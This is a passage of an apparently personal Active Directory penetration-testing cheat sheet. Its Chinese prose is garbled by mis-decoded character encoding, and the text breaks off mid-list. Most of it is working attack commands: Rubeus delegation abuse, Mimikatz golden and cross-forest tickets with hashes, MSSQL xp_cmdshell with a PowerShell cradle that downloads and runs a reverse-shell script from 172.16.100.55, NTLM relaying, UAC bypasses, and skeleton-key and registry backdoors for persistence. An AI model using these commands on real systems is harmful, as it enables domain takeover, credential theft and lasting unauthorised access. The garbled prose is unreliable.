çº¦æŸå§”æ´¾å¯ä»¥åœ¨å‰ç«¯æœåŠ¡å™¨ï¼ˆä¾‹å¦‚IISï¼‰ä¸Šè®¾ç½®çº¦æŸå§”æ´¾ï¼Œä»¥å…è®¸å®ƒä»£è¡¨ç”¨æˆ·ä»…å§”æ´¾ç»™é€‰å®šçš„åŽç«¯æœåŠ¡ï¼ˆä¾‹å¦‚MSSQLï¼‰ã€‚ DACL UACå±žæ€§ï¼šTrustedToAuthForDelegationã€‚è¿™å…è®¸s4u2selfï¼ˆå³ï¼Œä»…ä½¿ç”¨NTLMå¯†ç å“ˆå¸Œå€¼ï¼‰ä»£è¡¨ä»»ä½•äººè‡ªå·±è¯·æ±‚TGS ã€‚è¿™æœ‰æ•ˆåœ°å…è®¸è¯¥æœåŠ¡ä»…ä½¿ç”¨ä»–ä»¬çš„å“ˆå¸Œæ¥æ¨¡æ‹ŸåŸŸä¸­çš„å…¶ä»–ç”¨æˆ·ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·å’Œå‰ç«¯ä¹‹é—´ä¸ä½¿ç”¨Kerberosçš„æƒ…å†µä¸‹éžå¸¸æœ‰ç”¨ã€‚ DACLå±žæ€§ï¼šmsDS-AllowedToDelegateToã€‚æ­¤å±žæ€§åŒ…å«å…è®¸åœ¨å…¶ä¸Šä½¿ç”¨çš„SPN s4u2proxyï¼Œå³åŸºäºŽçŽ°æœ‰TGSï¼ˆä¾‹å¦‚ï¼Œä»Žä¸­ä½¿ç”¨æ‰€èŽ·å¾—çš„TGSï¼‰è¯·æ±‚è¯¥æœåŠ¡å™¨çš„å¯è½¬å‘TGS s4u2selfã€‚è¿™æœ‰æ•ˆåœ°å®šä¹‰äº†å…è®¸å§”æ´¾å§”æ´¾çš„åŽç«¯æœåŠ¡ã€‚ æ³¨æ„ï¼šè¿™äº›å±žæ€§ä¸ä¸€å®šå¿…é¡»å¹¶å­˜ï¼å¦‚æžœs4u2proxyä¸å…è®¸ä½¿ç”¨s4u2selfï¼Œåˆ™éœ€è¦ç”¨æˆ·äº¤äº’æ‰èƒ½ä»Žç”¨æˆ·èŽ·å¾—æœ‰æ•ˆçš„TGSåˆ°å‰ç«¯æœåŠ¡ï¼Œç±»ä¼¼äºŽæ— çº¦æŸå§”æ´¾ã€‚ Exploitationåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨Rubeusè‡ªåŠ¨è¯·æ±‚TGTï¼Œç„¶åŽä½¿ç”¨å¸¦æœ‰ldapSPNçš„TGSï¼Œä»¥å…è®¸æˆ‘ä»¬ä½¿ç”¨è®¡ç®—æœºå¸æˆ·è¿›è¡ŒDCSyncã€‚ 12345678# Get a TGT using the compromised service account with delegation set (if needed).\Rubeus.exe asktgt /user:sa_with_delegation /domain:domain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt# Same as above, but access the LDAP service on the DC (for dcsync) using pw hash.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E åŸºäºŽèµ„æºçš„çº¦æŸå§”æ´¾åŸºäºŽèµ„æºçš„çº¦æŸå§”æ´¾ï¼ˆRBCDï¼‰å°†åŽç«¯æœåŠ¡å™¨ï¼ˆä¾‹å¦‚MSSQLï¼‰é…ç½®ä¸ºä»…å…è®¸é€‰å®šçš„å‰ç«¯æœåŠ¡ï¼ˆä¾‹å¦‚IISï¼‰ä»£è¡¨ç”¨æˆ·è¿›è¡Œå§”æ´¾ã€‚è¿™ä½¿ç‰¹å®šçš„æœåŠ¡å™¨ç®¡ç†å‘˜å¯ä»¥æ›´è½»æ¾åœ°é…ç½®å§”æ´¾ï¼Œè€Œæ— éœ€åŸŸç®¡ç†å‘˜æƒé™ã€‚ DACLå±žæ€§ï¼šmsDS-AllowedToActOnBehalfOfOtherIdentityã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œs4u2selfå¹¶ä¸”å’Œs4u2proxyä¸€æ ·ç”¨äºŽä»£è¡¨ç”¨æˆ·è¯·æ±‚å¯è½¬å‘ç¥¨è¯ã€‚ä½†æ˜¯ï¼Œä½¿ç”¨RBCDï¼ŒKDCä¼šæ£€æŸ¥åŽç«¯æœåŠ¡çš„å±žæ€§ä¸­æ˜¯å¦å­˜åœ¨ç”¨äºŽè¯·æ±‚æœåŠ¡ï¼ˆå³å‰ç«¯æœåŠ¡ï¼‰çš„SPN ã€‚è¿™æ„å‘³ç€å‰ç«¯æœåŠ¡éœ€è¦è®¾ç½®SPNã€‚å› æ­¤ï¼Œå¿…é¡»ä»Žå…·æœ‰SPNçš„æœåŠ¡å¸æˆ·æˆ–è®¡ç®—æœºå¸æˆ·å¯¹RBCè¿›è¡Œæ”»å‡»ã€‚msDS-AllowedToActOnBehalfOfOtherIdentity Exploitationå¦‚æžœæˆ‘ä»¬æŸå®³å‡ºçŽ°åœ¨åŽç«¯æœåŠ¡çš„RBCDå±žæ€§ä¸­çš„å‰ç«¯æœåŠ¡ï¼Œåˆ™åˆ©ç”¨ä¸Žä¸Šé¢çš„å—çº¦æŸå§”æ´¾ç›¸åŒã€‚ä½†æ˜¯ï¼Œè¿™ä¸å¤ªå¸¸è§ã€‚ æ›´ç»å¸¸çœ‹åˆ°æ”»å‡»RBCDæ˜¯å½“æˆ‘ä»¬æœ‰GenericWriteï¼ŒGenericAllï¼ŒWritePropertyï¼Œæˆ–WriteDACLè®¸å¯åœ¨åŸŸä¸­çš„è®¡ç®—æœºå¯¹è±¡ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥msDS-AllowedToActOnBehalfOfOtherIdentityåœ¨è¯¥è®¡ç®—æœºå¸æˆ·ä¸Šå†™å…¥å±žæ€§ï¼Œä»¥æ·»åŠ å—ä¿¡ä»»çš„SPNæˆ–è®¡ç®—æœºå¸æˆ·ä»¥è¿›è¡Œå§”æ´¾ã€‚æˆ‘ä»¬ç”šè‡³å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„è®¡ç®—æœºå¸æˆ·å¹¶æ·»åŠ å®ƒã€‚å°±åƒä¸Šé¢çš„çº¦æŸå§”æ´¾ä¸€æ ·ï¼Œè¿™ä½¿æˆ‘ä»¬å¯ä»¥åœ¨ä»»ä½•ç”¨æˆ·çš„ä¸Šä¸‹æ–‡ä¸­ç ´åç›®æ ‡è®¡ç®—æœºã€‚ 1234567891011121314# Create a new machine account using PowerMadNew-MachineAccount -MachineAccount InconspicuousMachineAccount -Password $(ConvertTo-SecureString 'Compromised123!' -AsPlainText -Force)# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target$sid = Get-DomainComputer -Identity InconspicuousMachineAccount -Properties objectsid | Select -Expand objectsid$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"$SDbytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDbytes,0)# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the targetGet-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @&#123;'msdsallowedtoactonbehalfofotheridentity'=$SDBytes&#125;# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target.\Rubeus.exe s4u /user:InconspicuousMachineAccount$ /rc4:3644AC5E3D9441CCBCEF08CBAF98E910 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv01.corp1.com /ptt æ»¥ç”¨åŸŸä¿¡ä»»å¿…é¡»ä»¥DAç‰¹æƒè¿è¡Œã€‚ ä½¿ç”¨åŸŸä¿¡ä»»å¯†é’¥ä»ŽDCä¸­ï¼Œcurrentdomain\targetdomain$ä½¿ç”¨Mimikatzï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨LSADumpæˆ–DCSyncï¼‰è½¬å‚¨ä¿¡ä»»å¸æˆ·çš„å“ˆå¸Œã€‚ç„¶åŽï¼Œä½¿ç”¨æ­¤ä¿¡ä»»å¯†é’¥å’ŒåŸŸSIDï¼Œä½¿ç”¨Mimikatzä¼ªé€ ä¸€ä¸ªè·¨åŸŸTGTï¼Œå°†ç›®æ ‡åŸŸçš„ä¼ä¸šç®¡ç†å‘˜ç»„çš„SIDæ·»åŠ åˆ°æˆ‘ä»¬çš„â€œ SID historyâ€ä¸­ã€‚ 1kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi ä½¿ç”¨Rubeus. ç¡®ä¿æ‚¨å…·æœ‰æ­£ç¡®çš„Rubeusç‰ˆæœ¬ã€‚ç”±äºŽæŸäº›åŽŸå› ï¼Œæˆ‘çš„æŸäº›ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ç»™å‡ºäº†é”™è¯¯KDC_ERR_WRONG_REALMï¼Œè€ŒCRTPæä¾›çš„ç‰ˆæœ¬å¯ä»¥æ­£å¸¸å·¥ä½œã€‚ 1.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt çŽ°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥DCSyncç›®æ ‡åŸŸï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰ã€‚ ä½¿ç”¨krbtgtå“ˆå¸ŒFä»ŽDCä¸­ï¼Œä½¿ç”¨DCSyncæˆ–LSADumpè½¬å‚¨krbtgtå“ˆå¸Œã€‚ç„¶åŽï¼Œåƒä»¥å‰çš„æ–¹æ³•ä¸€æ ·ï¼Œä½¿ç”¨æ­¤å“ˆå¸Œï¼Œä½¿ç”¨Mimikatzä¼ªé€ ä¸€ä¸ªè·¨åŸŸTGTã€‚ ä½¿ç”¨SIDåŽ†å²ï¼ˆ/sidsçš„ï¼‰*-516å’ŒS-1-5-9ä»¥ä¼ªè£…çš„åŸŸæŽ§åˆ¶å™¨ç»„å’Œä¼ä¸šåŸŸæŽ§åˆ¶å™¨åˆ†åˆ«æ˜¯åœ¨æ—¥å¿—ä¸­çš„å™ªå£°ä½Žã€‚ 1kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:dcorp-dc$ /groups:516 /ptt å¦‚æžœæ‚¨åœ¨åˆ›å»ºæ­¤ç¥¨è¯æ—¶é‡åˆ°é—®é¢˜ï¼Œè¯·å°è¯•æ·»åŠ â€œ targetâ€æ ‡å¿—ï¼Œä¾‹å¦‚/target:moneycorp.local. æˆ–è€…ï¼Œç”Ÿæˆå…·æœ‰EAç»„çš„SIDåŽ†å²è®°å½•çš„åŸŸç®¡ç†å‘˜ç¥¨è¯ã€‚ 1kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt çŽ°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç«‹å³DCSyncç›®æ ‡åŸŸï¼Œæˆ–ä½¿ç”¨è®¡åˆ’ä»»åŠ¡èŽ·å–åå‘shellã€‚ æ»¥ç”¨æž—é—´ä¿¡ä»»ç”±äºŽæž—æ˜¯å®‰å…¨è¾¹ç•Œï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½è®¿é—®å·²ä¸Žæˆ‘ä»¬å…¥ä¾µçš„åŸŸï¼ˆæˆ‘ä»¬çš„æºåŸŸï¼‰å…±äº«çš„åŸŸæœåŠ¡ã€‚ä½¿ç”¨ä¾‹å¦‚BloodHoundæŸ¥æ‰¾åœ¨ä¸¤ä¸ªæž—ä¸­éƒ½å…·æœ‰å¸æˆ·ï¼ˆå…·æœ‰ç›¸åŒç”¨æˆ·åï¼‰çš„ç”¨æˆ·ï¼Œç„¶åŽå°è¯•é‡ç”¨å¯†ç ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨PowerViewæ¥æœå¯»æž—ä¹‹é—´çš„å¤–éƒ¨ç»„æˆå‘˜èº«ä»½ã€‚ 1Get-DomainForeignGroupMember -domain corp2.com åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šåœ¨æž—ä¹‹é—´ç¦ç”¨SIDè¿‡æ»¤ï¼ˆå¯¼è‡´ä¸Šè¿°æƒ…å†µçš„ä¿æŠ¤ï¼‰ã€‚å¦‚æžœæ‚¨è¿è¡ŒGet-DomainTrustå¹¶çœ‹åˆ°è¯¥TREAT_AS_EXTERNALå±žæ€§ï¼Œä¾¿æ˜¯è¿™ç§æƒ…å†µï¼åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä¸Šæ‰€è¿°ï¼Œæ‚¨å¯ä»¥åƒåŸŸä¿¡ä»»ä¸€æ ·æ»¥ç”¨ç›®å½•æž—ä¿¡ä»»ã€‚è¯·æ³¨æ„ï¼Œæ‚¨ä»ç„¶å¯ä»¥ä¸ä¼ªé€ è½¦ç¥¨500å’Œ1000ä¹‹é—´çš„ä»»ä½•SIDçš„ï¼Œæ‰€ä»¥ä½ ä¸èƒ½æˆä¸ºDAï¼ˆç”šè‡³æ²¡æœ‰é—´æŽ¥é€šè¿‡ç»„ç»§æ‰¿ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯»æ‰¾åœ¨åŸŸæŽ§åˆ¶å™¨ä¸ŠæŽˆäºˆæœ¬åœ°ç®¡ç†å‘˜æˆ–ç±»ä¼¼éžåŸŸç‰¹æƒçš„ç»„ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ­¤åšå®¢æ–‡ç« ã€‚ è¦æ¨¡æ‹Ÿæ¥è‡ªæˆ‘ä»¬æºåŸŸçš„ç”¨æˆ·ä»¥è®¿é—®å¤–éƒ¨åŸŸä¸­çš„æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œã€‚å¦‚ä¸Šè¿°â€œä½¿ç”¨åŸŸä¿¡ä»»å¯†é’¥â€ä¸­é‚£æ ·æå–æž—é—´ä¿¡ä»»å¯†é’¥ã€‚ ä½¿ç”¨Mimikatzé€šè¿‡ä¿¡ä»»å¯†é’¥ä¸ºç›®æ ‡åŸŸç”ŸæˆTGTï¼š 1Kerberos::golden /user:Administrator /service:krbtgt /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:eurocorp.local /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:eucorp-tgt.kirbi ç„¶åŽï¼Œä½¿ç”¨RubeusCIFSä½¿ç”¨è¯¥TGTå‘TGSè¯¢é—®ä¾‹å¦‚ç›®æ ‡DCä¸Šçš„æœåŠ¡ã€‚ 1.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt çŽ°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç›®æ ‡æž—çš„DCä¸Šçš„CIFSæœåŠ¡ç”¨ä½œæºåŸŸçš„DAï¼ˆåŒæ ·ï¼Œåªè¦æ­¤ä¿¡ä»»å…³ç³»å·²é…ç½®ä¸ºå­˜åœ¨ï¼‰ã€‚ æ»¥ç”¨MSSQLæ•°æ®åº“è¿›è¡Œæ¨ªå‘ç§»åŠ¨å¯ä»¥é“¾æŽ¥MSSQLæ•°æ®åº“ï¼Œè¿™æ ·ï¼Œå¦‚æžœæ‚¨ç ´åäº†ä¸€ä¸ªæ•°æ®åº“ï¼Œåˆ™å¯ä»¥åœ¨ç‰¹å®šç”¨æˆ·ï¼ˆsaä¹Ÿè®¸æ˜¯ï¼‰çš„ä¸Šä¸‹æ–‡ä¸­å¯¹å…¶ä»–æ•°æ®åº“æ‰§è¡ŒæŸ¥è¯¢ï¼ˆç”šè‡³å‘½ä»¤ï¼ï¼‰ã€‚è¿™ç”šè‡³å¯ä»¥è·¨æ£®æž—å·¥ä½œï¼å¦‚æžœæ‰§è¡ŒSQLï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æžšä¸¾æ•°æ®åº“é“¾æŽ¥ã€‚ 12345678910-- æŸ¥æ‰¾é“¾æŽ¥çš„æœåŠ¡å™¨EXEC sp_linkedservers-- åœ¨é“¾æŽ¥æœåŠ¡å™¨ä¸Šè¿è¡ŒSQLæŸ¥è¯¢select mylogin from openquery("dc01", 'select SYSTEM_USER as mylogin')-- åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šå¯ç”¨â€œ xp_cmdshellâ€å¹¶æ‰§è¡Œå‘½ä»¤EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT DC01EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT DC01EXEC ('xp_cmdshell ''whoami'' ') AT DC01 æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨PowerUpSQLåœ¨åŸŸä¸­æŸ¥æ‰¾æ•°æ®åº“ï¼Œå¹¶æ”¶é›†æœ‰å…³ï¼ˆå¯è¾¾ï¼‰æ•°æ®åº“çš„æ›´å¤šä¿¡æ¯ã€‚æˆ‘ä»¬è¿˜å¯ä»¥è‡ªåŠ¨åœ¨é“¾æŽ¥çš„æ•°æ®åº“ä¸­æŸ¥æ‰¾å¹¶æ‰§è¡ŒæŸ¥è¯¢æˆ–å‘½ä»¤ï¼ˆç”šè‡³é€šè¿‡å¤šå±‚æ•°æ®åº“é“¾æŽ¥ï¼‰ã€‚ 12345678910111213141516171819202122232425# èŽ·å–åŸŸä¸­çš„MSSQLæ•°æ®åº“ï¼Œå¹¶æµ‹è¯•è¿žé€šæ€§Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft# å°è¯•èŽ·å–æ‰€æœ‰åŸŸæ•°æ®åº“ä¸Šçš„ä¿¡æ¯Get-SQLInstanceDomain | Get-SQLServerInfo# åœ¨å•ä¸ªå¯è®¿é—®çš„æ•°æ®åº“ä¸ŠèŽ·å–ä¿¡æ¯Get-SQLServerInfo -Instance dcorp-mssql# æ‰«æMSSQLé”™è¯¯é…ç½®ä»¥å‡çº§åˆ°SAInvoke-SQLAudit -Verbose -Instance UFC-SQLDEV# æ‰§è¡ŒSQLæŸ¥è¯¢Get-SQLQuery -Query "SELECT system_user" -Instance UFC-SQLDEV# è¿è¡Œå‘½ä»¤ï¼ˆéœ€è¦å¯ç”¨XP_CMDSHELLï¼‰Invoke-SQLOSCmd -Instance devsrv -Command "whoami" | select -ExpandProperty CommandResults# è‡ªåŠ¨æŸ¥æ‰¾æ‰€æœ‰é“¾æŽ¥çš„æ•°æ®åº“Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft# å¦‚æžœåœ¨ä»»ä½•é“¾æŽ¥çš„æ•°æ®åº“ä¸Šå¯ç”¨äº†XP_CMDSHELLï¼Œåˆ™è¿è¡Œå‘½ä»¤Get-SqlServerLinkCrawl -Instance dcorp-mssql -Query 'EXEC xp_cmdshell "whoami"' | select instance,links,customquery | ftGet-SqlServerLinkCrawl -Instance dcorp-mssql -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"' | select instance,links,customquery | ft å¦‚æžœæ‚¨å…·æœ‰å¯¹MSSQLæ•°æ®åº“çš„ä½Žç‰¹æƒè®¿é—®æƒé™ï¼Œå¹¶ä¸”ä¸å­˜åœ¨ä»»ä½•é“¾æŽ¥ï¼Œåˆ™æœ‰å¯èƒ½é€šè¿‡ä½¿ç”¨xp_dirtreeå­˜å‚¨è¿‡ç¨‹è®¿é—®æ­¤å…±äº«æ¥å¼ºåˆ¶æ‰§è¡ŒNTLMèº«ä»½éªŒè¯ã€‚å¦‚æžœæˆåŠŸï¼Œåˆ™å¯ä»¥æ”¶é›†SQLæœåŠ¡å¸æˆ·çš„NetNTLMï¼Œå¹¶å¯èƒ½å°†å…¶ç ´è§£æˆ–ä¸­ç»§ï¼Œä»¥ç ´åä½œä¸ºè¯¥æœåŠ¡å¸æˆ·çš„è®¡ç®—æœºã€‚ 1EXEC master..xp_dirtree "\\192.168.49.67\share" ä¸­ç»§å“ˆå¸Œä»¥é€šè¿‡èº«ä»½éªŒè¯ä¸ºæœ¬åœ°adminçš„ç¤ºä¾‹å‘½ä»¤ï¼ˆå¦‚æžœæœåŠ¡å¸æˆ·å…·æœ‰è¿™äº›ç‰¹æƒï¼‰å¹¶è¿è¡Œcalc.exeã€‚å¿½ç•¥è¯¥-cå‚æ•°å°è¯•å°è¯•secretsdumpã€‚ 1sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe' ç‰¹æƒæå‡æœ‰å…³æ›´å¤šä¿¡æ¯ï¼ˆåŒ…æ‹¬Windowså’ŒLinuxï¼‰ï¼Œè¯·å‚é˜…æˆ‘çš„OSCPå¤‡å¿˜å•å’Œå‘½ä»¤å‚è€ƒã€‚ PowerUp12345678910# æ£€æŸ¥æ˜“å—æ”»å‡»çš„ç¨‹åºå’Œé…ç½®Invoke-AllChecks# åˆ©ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡æƒé™ï¼ˆä¸éœ€è¦è§¦æ‘¸ç£ç›˜ï¼‰Invoke-ServiceAbuse -Name "AbyssWebServer" -Command "net localgroup Administrators domain\user /add"# åˆ©ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡æƒé™è§¦å‘ç¨³å®šçš„beaconWrite-ServiceBinary -Name 'AbyssWebServer' -Command 'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update' -Path 'C:\WebServer\Abyss'net stop AbyssWebServernet start AbyssWebServer Bypass UACä½¿ç”¨SharpBypassUACã€‚ 12345# ç”ŸæˆEncodedCommandecho -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update' | base64# ä½¿ç”¨ SharpBypassUAC e.g. ä»ŽCobaltStrike çš„ä¸€ä¸ªbeaconbeacon&gt; execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ== åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿è¡Œæ‰‹åŠ¨Bypass UAC ï¼ˆä¾‹å¦‚FODHelper bypassï¼‰å¯èƒ½ä¼šå˜å¾—æ›´å¥½ï¼Œè€ŒFODHelperæ—è·¯åœ¨PowerShellä¸­æ‰§è¡Œèµ·æ¥éžå¸¸ç®€å•ã€‚ 1234567891011121314# The command to execute in high integrity context$cmd = "cmd /c start powershell.exe" # Set the registry valuesNew-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -ForceNew-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -ForceSet-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force # Trigger fodhelper to perform the bypassStart-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden # Clean registryStart-Sleep 3Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force Persistenceå¯åŠ¨æ–‡ä»¶å¤¹åªéœ€åˆ é™¤ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚ç»å…¸ðŸ˜ŽðŸš© åœ¨å½“å‰ç”¨æˆ·æ–‡ä»¶å¤¹ä¸­ï¼Œå°†åœ¨å½“å‰ç”¨æˆ·ç™»å½•æ—¶è§¦å‘ï¼š 1c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup æˆ–åœ¨å¯åŠ¨æ–‡ä»¶å¤¹ä¸­ï¼Œéœ€è¦ç®¡ç†ç‰¹æƒï¼Œä½†åœ¨å¯åŠ¨æ—¶ä»¥åŠä»»ä½•ç”¨æˆ·ç™»å½•æ—¶å°†ä»¥SYSTEMèº«ä»½è§¦å‘ï¼š 1C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp åŸŸæŒä¹…æ€§å¿…é¡»ä»¥DAç‰¹æƒè¿è¡Œã€‚ Mimikatzä¸‡èƒ½é’¥åŒ™æ”»å‡»ä»ŽDCè¿è¡Œã€‚ä¸ºæ‰€æœ‰ç”¨æˆ·ðŸš©å¯ç”¨å¯†ç â€œ mimikatzâ€ã€‚ 12privilege::debugmisc::skeleton ä½¿ç”¨PowerViewæŽˆäºˆç‰¹å®šçš„ç”¨æˆ·DCSyncæƒé™éšæ—¶ä¸ºæ‚¨æä¾›ç”¨æˆ·é€‰æ‹©çš„DCSyncæƒé™ã€‚åœ¨æŸäº›è®¾ç½®ä¸­å¯èƒ½ä¼šé€ƒé¿æ£€æµ‹ã€‚ 1Add-ObjectACL -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student355 -Rights DCSync åŸŸæŽ§åˆ¶å™¨DSRMç®¡ç†å‘˜DSRMç®¡ç†å‘˜æ˜¯DCçš„æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·ã€‚é¦–å…ˆéœ€è¦å¯ç”¨è¿œç¨‹ç™»å½•ã€‚ 1New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD çŽ°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰è½¬å‚¨åœ¨DCä¸Šçš„æœ¬åœ°ç®¡ç†å“ˆå¸Œå€¼è¿œç¨‹ç™»å½•ï¼ˆä½¿ç”¨lsadump::samï¼Œè¯·å‚è§ä¸‹é¢çš„â€œä½¿ç”¨Mimikatzè½¬å‚¨ç§˜å¯†â€ï¼‰ã€‚ä½¿ç”¨ä¾‹å¦‚â€œè¶Šè¿‡å“ˆå¸Œâ€æ¥èŽ·å¾—ä¼šè¯ï¼ˆè¯·å‚è§ä¸Šé¢çš„â€œ Mimikatzâ€ï¼‰ã€‚ ä¿®æ”¹å®‰å…¨æè¿°ç¬¦ä»¥è¿›è¡Œè¿œç¨‹WMIè®¿é—®ä½¿ç”¨Set-RemoteWMI.ps1cmdletå‘ç”¨æˆ·WMIè®¿é—®è®¡ç®—æœºã€‚å¯ä»¥è¿è¡Œä»¥æŒä¹…è®¿é—®ä¾‹å¦‚DCã€‚ 1Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' æœ‰å…³æ‰§è¡Œï¼Œè¯·å‚è§ä¸Šé¢çš„â€œä½¿ç”¨WMIæ‰§è¡Œå‘½ä»¤â€ã€‚ ä¿®æ”¹PowerShellè¿œç¨‹è®¿é—®çš„å®‰å…¨æè¿°ç¬¦ä½¿ç”¨Set-RemotePSRemoting.ps1cmdletå‘ç”¨æˆ·PowerShellè¿œç¨‹è®¿é—®è®¡ç®—æœºã€‚å¯ä»¥è¿è¡Œä»¥æŒä¹…è®¿é—®ä¾‹å¦‚DCã€‚ 1Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local æœ‰å…³æ‰§è¡Œï¼Œè¯·å‚è§ä¸Šé¢çš„â€œä½¿ç”¨PowerShell Remotingæ‰§è¡Œå‘½ä»¤â€ã€‚ ä¿®æ”¹DCæ³¨å†Œè¡¨å®‰å…¨æè¿°ç¬¦ä»¥ä½¿ç”¨DAMPè¿›è¡Œè¿œç¨‹å“ˆå¸Œæ£€ç´¢ä½¿ç”¨DAMPå·¥å…·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€Ÿå£³DCæ³¨å†Œè¡¨æ¥ç»™æˆ‘ä»¬ä¸Šçš„è®¿é—®SAMï¼ŒSYSTEMä»¥åŠSECURITYæ³¨å†Œè¡¨é…ç½®å•å…ƒã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿè¿œç¨‹è½¬å‚¨DCæœºå¯†ï¼ˆå“ˆå¸Œï¼‰ã€‚ æˆ‘ä»¬ä½¿ç”¨Add-RemoteRegBackdoor.ps1æ¥è‡ªDAMPçš„cmdletæ·»åŠ åŽé—¨ã€‚ 1Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee Student355 ä½¿ç”¨RemoteHashRetrieval.ps1DAMPä¸­çš„cmdletè¿œç¨‹è½¬å‚¨ç§˜å¯†ï¼ˆä»¥â€œå—ä¿¡ä»»â€ç”¨æˆ·èº«ä»½è¿è¡Œï¼‰ã€‚ 12345678# èŽ·å–é’ˆå¯¹é“¶ç¥¨æ”»å‡»çš„æœºå™¨å¸æˆ·å“ˆå¸ŒGet-RemoteMachineAccountHash -ComputerName dcorp-dc# èŽ·å–æœ¬åœ°å¸æˆ·å“ˆå¸ŒGet-RemoteLocalAccountHash -ComputerName dcorp-dc# 